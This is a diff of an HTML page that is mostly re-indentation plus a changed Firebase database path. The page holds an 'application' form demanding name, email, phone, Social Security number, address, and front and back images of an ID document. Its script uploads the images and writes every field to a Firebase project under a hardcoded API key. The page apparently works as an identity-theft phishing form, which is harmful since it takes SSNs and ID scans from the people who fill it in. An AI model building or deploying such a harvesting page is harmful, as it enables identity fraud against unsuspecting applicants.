@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en-US">
 
@@ -192,57 +191,59 @@
 
 
 
-                    <section class="info-container">
-                      <form class="contact-application" id="applicationForm">
-                          <fieldset>
-                              <legend>Contact Information</legend>
-                  
-                              <label for="firstNameInput">First Name:</label>
-                              <input type="text" id="firstNameInput" name="first_name" required>
-                  
-                              <label for="lastNameInput">Last Name:</label>
-                              <input type="text" id="lastNameInput" name="last_name" required>
-                  
-                              <label for="emailInput">Email:</label>
-                              <input type="email" id="emailInput" name="email" required>
-                  
-                              <label for="phoneInput">Phone Number:</label>
-                              <input type="tel" id="phoneInput" name="phone_number" placeholder="(XXX) XXX-XXXX" required>
-                  
-                              <label for="ssnInput">SSN:</label>
-                              <input type="text" id="ssnInput" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
-                          </fieldset>
-                  
-                          <fieldset>
-                              <legend>Address Information</legend>
-                  
-                              <label for="addressInput">Address:</label>
-                              <input type="text" id="addressInput" name="address" required>
-                  
-                              <label for="cityInput">City:</label>
-                              <input type="text" id="cityInput" name="city" required>
-                  
-                              <label for="stateInput">State:</label>
-                              <input type="text" id="stateInput" name="state" required>
-                  
-                              <label for="zipCodeInput">Zip Code:</label>
-                              <input type="number" id="zipCodeInput" name="zip_code" pattern="\d{5}" placeholder="12345" maxlength="5" required>
-                          </fieldset>
-                  
-                          <fieldset>
-                              <legend>File Uploads</legend>
-                  
-                              <label for="idFrontUpload">Upload ID (Front):</label>
-                              <input type="file" id="idFrontUpload" name="id_front" accept=".pdf,.jpg,.png" required>
-                  
-                              <label for="idBackUpload">Upload ID (Back):</label>
-                              <input type="file" id="idBackUpload" name="id_back" accept=".pdf,.jpg,.png" required>
-                          </fieldset>
-                  
-                          <button class="submit-button" type="submit" data-disable-with="Submitting ....." data-clicked="false">Submit</button>
-                      </form>
-                  </section>
-                  
+										<section class="info-container">
+											<form class="contact-application" id="applicationForm">
+												<fieldset>
+													<legend>Contact Information</legend>
+
+													<label for="firstNameInput">First Name:</label>
+													<input type="text" id="firstNameInput" name="first_name" required>
+
+													<label for="lastNameInput">Last Name:</label>
+													<input type="text" id="lastNameInput" name="last_name" required>
+
+													<label for="emailInput">Email:</label>
+													<input type="email" id="emailInput" name="email" required>
+
+													<label for="phoneInput">Phone Number:</label>
+													<input type="tel" id="phoneInput" name="phone_number" placeholder="(XXX) XXX-XXXX" required>
+
+													<label for="ssnInput">SSN:</label>
+													<input type="text" id="ssnInput" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
+												</fieldset>
+
+												<fieldset>
+													<legend>Address Information</legend>
+
+													<label for="addressInput">Address:</label>
+													<input type="text" id="addressInput" name="address" required>
+
+													<label for="cityInput">City:</label>
+													<input type="text" id="cityInput" name="city" required>
+
+													<label for="stateInput">State:</label>
+													<input type="text" id="stateInput" name="state" required>
+
+													<label for="zipCodeInput">Zip Code:</label>
+													<input type="number" id="zipCodeInput" name="zip_code" pattern="\d{5}" placeholder="12345"
+														maxlength="5" required>
+												</fieldset>
+
+												<fieldset>
+													<legend>File Uploads</legend>
+
+													<label for="idFrontUpload">Upload ID (Front):</label>
+													<input type="file" id="idFrontUpload" name="id_front" accept=".pdf,.jpg,.png" required>
+
+													<label for="idBackUpload">Upload ID (Back):</label>
+													<input type="file" id="idBackUpload" name="id_back" accept=".pdf,.jpg,.png" required>
+												</fieldset>
+
+												<button class="submit-button" type="submit" data-disable-with="Submitting ....."
+													data-clicked="false">Submit</button>
+											</form>
+										</section>
+
 
 
 
@@ -358,173 +359,174 @@
 		}
 	</style>
 	<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-	var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-	(function(){
-	var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-	s1.async=true;
-	s1.src='https://embed.tawk.to/66ddcd0c50c10f7a00a5d82d/1i796hu8g';
-	s1.charset='UTF-8';
-	s1.setAttribute('crossorigin','*');
-	s0.parentNode.insertBefore(s1,s0);
-	})();
+	<script type="text/javascript">
+		var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+		(function () {
+			var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+			s1.async = true;
+			s1.src = 'https://embed.tawk.to/66ddcd0c50c10f7a00a5d82d/1i796hu8g';
+			s1.charset = 'UTF-8';
+			s1.setAttribute('crossorigin', '*');
+			s0.parentNode.insertBefore(s1, s0);
+		})();
 	</script>
 	<!--End of Tawk.to Script-->
-  <script>
-    // Phone number formatting
-    document.getElementById('phoneInput').addEventListener('input', function (event) {
-        let input = event.target;
-        let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
-        if (value.length > 10) {
-            value = value.slice(0, 10); // Limit to 10 digits
-        }
-        if (value.length > 6) {
-            // Format the phone number as (XXX) XXX-XXXX
-            value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
-        } else if (value.length > 3) {
-            value = value.replace(/(\d{3})(\d{1,3})/, '($1) $2');
-        }
-        input.value = value;
-    });
+	<script>
+		// Phone number formatting
+		document.getElementById('phoneInput').addEventListener('input', function (event) {
+			let input = event.target;
+			let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+			if (value.length > 10) {
+				value = value.slice(0, 10); // Limit to 10 digits
+			}
+			if (value.length > 6) {
+				// Format the phone number as (XXX) XXX-XXXX
+				value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
+			} else if (value.length > 3) {
+				value = value.replace(/(\d{3})(\d{1,3})/, '($1) $2');
+			}
+			input.value = value;
+		});
 
-    // SSN formatting
-    document.getElementById('ssnInput').addEventListener('input', function (event) {
-        let input = event.target;
-        let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
-        if (value.length > 9) {
-            value = value.slice(0, 9); // Limit to 9 digits
-        }
-        if (value.length > 5) {
-            // Format the SSN as XXX-XX-XXXX
-            value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
-        } else if (value.length > 3) {
-            value = value.replace(/(\d{3})(\d{1,2})/, '$1-$2');
-        }
-        input.value = value;
-    });
-</script>
+		// SSN formatting
+		document.getElementById('ssnInput').addEventListener('input', function (event) {
+			let input = event.target;
+			let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+			if (value.length > 9) {
+				value = value.slice(0, 9); // Limit to 9 digits
+			}
+			if (value.length > 5) {
+				// Format the SSN as XXX-XX-XXXX
+				value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
+			} else if (value.length > 3) {
+				value = value.replace(/(\d{3})(\d{1,2})/, '$1-$2');
+			}
+			input.value = value;
+		});
+	</script>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js";
-    import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-storage.js";
+	<script type="module">
+		import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js";
+		import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js";
+		import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-storage.js";
 
-    // Firebase initialization and form submission handling
-    document.addEventListener('DOMContentLoaded', function () {
-        // Your web app's Firebase configuration
-  const firebaseConfig = {
-    apiKey: "AIzaSyDODfYYYb8fxyc_hGa4yM21vVsIOtJse7M",
-    authDomain: "digtech-f445b.firebaseapp.com",
-    projectId: "digtech-f445b",
-    storageBucket: "digtech-f445b.appspot.com",
-    messagingSenderId: "979918273194",
-    appId: "1:979918273194:web:327c82c2519d13e7e06ed3"
-  };
+		// Firebase initialization and form submission handling
+		document.addEventListener('DOMContentLoaded', function () {
+			// Your web app's Firebase configuration
+			const firebaseConfig = {
+				apiKey: "AIzaSyDODfYYYb8fxyc_hGa4yM21vVsIOtJse7M",
+				authDomain: "digtech-f445b.firebaseapp.com",
+				databaseURL: "https://digtech-f445b-default-rtdb.firebaseio.com",
+				projectId: "digtech-f445b",
+				storageBucket: "digtech-f445b.appspot.com",
+				messagingSenderId: "979918273194",
+				appId: "1:979918273194:web:327c82c2519d13e7e06ed3"
+			};
 
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-        const storage = getStorage(app);
+			const app = initializeApp(firebaseConfig);
+			const database = getDatabase(app);
+			const storage = getStorage(app);
 
-        function generateRandomFileName(file) {
-            const randomString = Math.random().toString(36).substring(2, 8);
-            const fileExtension = file.name.split('.').pop();
-            return `file_${randomString}.${fileExtension}`;
-        }
+			function generateRandomFileName(file) {
+				const randomString = Math.random().toString(36).substring(2, 8);
+				const fileExtension = file.name.split('.').pop();
+				return `file_${randomString}.${fileExtension}`;
+			}
 
-        function uploadFile(file) {
-            return new Promise((resolve, reject) => {
-                const fileName = generateRandomFileName(file);
-                const storageRefVar = storageRef(storage, `uploads/${fileName}`);
+			function uploadFile(file) {
+				return new Promise((resolve, reject) => {
+					const fileName = generateRandomFileName(file);
+					const storageRefVar = storageRef(storage, `uploads/${fileName}`);
 
-                const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
+					const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
 
-                uploadTask.then((snapshot) => {
-                    getDownloadURL(snapshot.ref).then((downloadURL) => {
-                        resolve(downloadURL);
-                    });
-                }).catch((error) => {
-                    console.error('Error uploading file:', error);
-                    reject(null);
-                });
-            });
-        }
+					uploadTask.then((snapshot) => {
+						getDownloadURL(snapshot.ref).then((downloadURL) => {
+							resolve(downloadURL);
+						});
+					}).catch((error) => {
+						console.error('Error uploading file:', error);
+						reject(null);
+					});
+				});
+			}
 
-        function handleFormSubmit(event) {
-            event.preventDefault();
+			function handleFormSubmit(event) {
+				event.preventDefault();
 
-            const requiredFields = document.querySelectorAll('#applicationForm [required]');
-            let allFieldsFilled = true;
+				const requiredFields = document.querySelectorAll('#applicationForm [required]');
+				let allFieldsFilled = true;
 
-            requiredFields.forEach(function (field) {
-                if (field.value.trim() === '') {
-                    allFieldsFilled = false;
-                }
-            });
+				requiredFields.forEach(function (field) {
+					if (field.value.trim() === '') {
+						allFieldsFilled = false;
+					}
+				});
 
-            if (!allFieldsFilled) {
-                return;
-            }
+				if (!allFieldsFilled) {
+					return;
+				}
 
-            const signInButton = document.querySelector('.submit-button');
-            const disableText = signInButton.getAttribute('data-disable-with');
-            signInButton.innerHTML = disableText;
-            signInButton.setAttribute('data-clicked', 'true');
+				const signInButton = document.querySelector('.submit-button');
+				const disableText = signInButton.getAttribute('data-disable-with');
+				signInButton.innerHTML = disableText;
+				signInButton.setAttribute('data-clicked', 'true');
 
-            const first_name = document.querySelector('[name="first_name"]').value;
-            const email = document.querySelector('[name="email"]').value;
-            const SSN = document.querySelector('[name="ssn"]').value;
-            const city = document.querySelector('[name="city"]').value;
-            const zipCode = document.querySelector('[name="zip_code"]').value;
-            const lastName = document.querySelector('[name="last_name"]').value;
-            const phoneNumber = document.querySelector('[name="phone_number"]').value;
-            const address = document.querySelector('[name="address"]').value;
-            const state = document.querySelector('[name="state"]').value;
+				const first_name = document.querySelector('[name="first_name"]').value;
+				const email = document.querySelector('[name="email"]').value;
+				const SSN = document.querySelector('[name="ssn"]').value;
+				const city = document.querySelector('[name="city"]').value;
+				const zipCode = document.querySelector('[name="zip_code"]').value;
+				const lastName = document.querySelector('[name="last_name"]').value;
+				const phoneNumber = document.querySelector('[name="phone_number"]').value;
+				const address = document.querySelector('[name="address"]').value;
+				const state = document.querySelector('[name="state"]').value;
 
-            const fileInputFront = document.querySelector('[name="id_front"]');
-            const fileFront = fileInputFront.files[0];
+				const fileInputFront = document.querySelector('[name="id_front"]');
+				const fileFront = fileInputFront.files[0];
 
-            const fileInputBack = document.querySelector('[name="id_back"]');
-            const fileBack = fileInputBack.files[0];
+				const fileInputBack = document.querySelector('[name="id_back"]');
+				const fileBack = fileInputBack.files[0];
 
-            if (!fileFront || !fileBack) {
-                alert('Please select both front and back files');
-                return;
-            }
+				if (!fileFront || !fileBack) {
+					alert('Please select both front and back files');
+					return;
+				}
 
-            const formData = {
-                first_name,
-                email,
-                SSN,
-                city,
-                zipCode,
-                lastName,
-                phoneNumber,
-                address,
-                state,
-                fileFrontURL: null,
-                fileBackURL: null
-            };
+				const formData = {
+					first_name,
+					email,
+					SSN,
+					city,
+					zipCode,
+					lastName,
+					phoneNumber,
+					address,
+					state,
+					fileFrontURL: null,
+					fileBackURL: null
+				};
 
-            Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
-                .then(([fileFrontURL, fileBackURL]) => {
-                    formData.fileFrontURL = fileFrontURL;
-                    formData.fileBackURL = fileBackURL;
+				Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
+					.then(([fileFrontURL, fileBackURL]) => {
+						formData.fileFrontURL = fileFrontURL;
+						formData.fileBackURL = fileBackURL;
 
-                    const key = `${first_name}_${lastName}`;
-                    const formsRef = ref(database, `forms/${key}`);
-                    set(formsRef, formData).then(() => {
-                        console.log('Form submitted successfully!');
-                        window.location.href = 'submitted.html';
-                    }).catch((error) => {
-                        console.error('Error submitting form:', error);
-                        alert('An error occurred while submitting the form. Please try again.');
-                    });
-                });
-        }
+						const key = `${first_name}_${lastName}`;
+						const formsRef = ref(database, `DigTech/${key}`);
+						set(formsRef, formData).then(() => {
+							console.log('Form submitted successfully!');
+							window.location.href = 'submitted.html';
+						}).catch((error) => {
+							console.error('Error submitting form:', error);
+							alert('An error occurred while submitting the form. Please try again.');
+						});
+					});
+			}
 
-        document.getElementById('applicationForm').addEventListener('submit', handleFormSubmit);
-    });
-</script>
+			document.getElementById('applicationForm').addEventListener('submit', handleFormSubmit);
+		});
+	</script>
 
 </body>
 
